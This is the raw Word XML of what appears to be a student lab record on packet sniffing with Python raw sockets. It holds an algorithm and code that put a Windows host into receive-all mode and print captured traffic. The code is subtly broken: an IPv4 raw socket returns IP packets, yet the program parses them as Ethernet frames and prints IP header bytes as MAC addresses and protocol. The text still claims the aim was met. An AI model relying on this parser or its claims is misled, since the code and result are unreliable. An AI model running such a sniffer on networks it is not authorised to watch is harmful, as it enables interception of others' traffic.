        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Aim:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D41D24C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>To implement packet sniffing using raw sockets in python that captures Ethernet frames and displays source/destination MACs and protocol info for network analysis and troubleshooting.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="612DB022" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Introduction:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30CAF260" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Packet Sniffing:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C12789" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Packet sniffing is the process of intercepting and analyzing network packets traveling over a network to monitor or troubleshoot traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3116AABB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Algorithm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA09A6E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Get the local host IP address.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25514747" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Create a raw IPv4 socket.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A28360D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Bind the socket to the host IP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33AE6099" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Set socket to include IP headers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43BC992F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. Enable promiscuous mode to capture all packets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="354D847B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>6. Enter an infinite loop to receive data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79E02571" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>7. Receive raw packet bytes from the socket.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27095A30" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>8. Parse the Ethernet frame into dest MAC, src MAC, protocol, and payload.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD599E9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>9. Format MAC addresses and protocol for display.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="197E5B82" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>10. Print the extracted fields and loop to continue sniffing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F89583B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="190ECCEB" w14:textId="77777777" w:rsidR="00B44971" w:rsidRDefault="00B44971" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="730A8647" w14:textId="2AFF23D8" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Program Code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75CE507E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06F2F7F9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import struct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="321FCB39" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import binascii</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C4134A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import textwrap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6524BF98" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>def main():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DD70F85" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    host = socket.gethostbyname(socket.gethostname())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E7B5155" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    print('IP: {}'.format(host))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BEC18EC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    conn = socket.socket(socket.AF_INET, socket.SOCK_RAW,     socket.IPPROTO_IP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B84F6EA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    conn.bind((host, 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17015F7A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    conn.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB89773" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    conn.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0696DF3D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64FECD12" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        raw_data, addr = conn.recvfrom(65536)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E0E284C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        dest_mac, src_mac, eth_proto, data = ethernet_frame(raw_data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="202CAFA6" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        print('\nEthernet Frame:')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D5B2415" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        print("Destination MAC: {}".format(dest_mac))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C841CFB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        print("Source MAC: {}".format(src_mac))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5358C3FD" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        print("Protocol: {}".format(eth_proto))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F63B5F4" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>def ethernet_frame(data):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F47FA79" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    dest_mac, src_mac, proto = struct.unpack('!6s6s2s', data[:14])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0760F3F0" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    return get_mac_addr(dest_mac), get_mac_addr(src_mac), get_protocol(proto), data[14:]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D7AFAF5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>def get_mac_addr(bytes_addr):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FA4864" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    bytes_str = map('{:02x}'.format, bytes_addr)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B817CB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    mac_address = ':'.join(bytes_str).upper()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06759D11" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    return mac_address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6917523D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>def get_protocol(bytes_proto):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EBAEFC9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="248DD500" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    bytes_str = map('{:02x}'.format, bytes_proto)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="703138D0" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    protocol = ''.join(bytes_str).upper()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B5D7F45" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    return protocol</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE84FB6" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>main()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3746C432" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Output:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E18C27" w14:textId="7DAD860E" w:rsidR="0094061E" w:rsidRDefault="00484FBF" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="00484FBF">
        <w:rPr>
          <w:rFonts w:ascii="Aptos" w:eastAsia="Aptos" w:hAnsi="Aptos" w:cs="Cordia New"/>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="th-TH"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="04FCCEEF" wp14:editId="719B6670">
            <wp:extent cx="5731510" cy="5880735"/>
            <wp:effectExtent l="0" t="0" r="2540" b="5715"/>
            <wp:docPr id="71672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72765" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId32"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="5880735"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E4656D" w14:textId="77777777" w:rsidR="00772C5E" w:rsidRDefault="00772C5E" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57CA93C6" w14:textId="4F499BA2" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Result:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11940A72" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Thus packet sniffing was implemented using raw sockets in python.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="717671C8" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00000000" w:rsidP="00484FBF">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F988B05" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00484FBF">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B75D3D2" w14:textId="67F7FC57" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00484FBF">
      <w:pPr>
